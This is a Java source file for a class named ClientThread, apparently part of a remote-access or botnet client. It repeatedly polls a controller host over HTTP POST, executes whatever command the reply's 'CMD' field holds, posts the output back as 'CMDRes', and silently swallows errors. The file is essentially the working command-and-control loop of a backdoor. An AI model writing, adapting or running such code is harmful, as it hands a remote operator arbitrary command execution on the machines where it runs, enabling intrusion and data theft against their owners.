package Threads;

import Execution.CMDExec;
import Net.*;
import java.util.concurrent.TimeUnit;

public class ClientThread extends Service implements Runnable {

    java.util.Map<String, String> Params;

    public ClientThread(java.util.Map<String, String> params, String KEY, String controllHost, String manageSection) {
        this.Params = params;
        super.setControllHost(controllHost);
        super.setKEY(KEY);
        super.setManageSection(manageSection);
    }

    @Override
    public void run() {
        String cmd = "";
        try {
            while (true) {
                try {
                    java.util.Map<String, String> params = new java.util.HashMap<>(Params);
                    HTTPPost site = new HTTPPost(getAddr(), params, "POST");
                    site.connect();
                    String cmdOld = cmd;
                    cmd = CMDExec.execute(site.getResponse(true).get("CMD"));
                    if (cmdOld.equals(cmd) || cmd.equals("NORES")) {
                        TimeUnit.MILLISECONDS.sleep(this.timeDelay);
                        continue;
                    }
                    site.close();
                    params.put("CMDRes", cmd);
                    site = new HTTPPost(getAddr(), params, "POST");
                    site.connect();
                    System.out.println(site.getResponse());
                    TimeUnit.MILLISECONDS.sleep(this.timeDelay);
                } catch (Exception e) {
                    //e.printStackTrace();
                }
            }
        } catch (Exception e) {
            //e.printStackTrace();
        }
    }

    @Override
    public void start() throws Exception {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

}
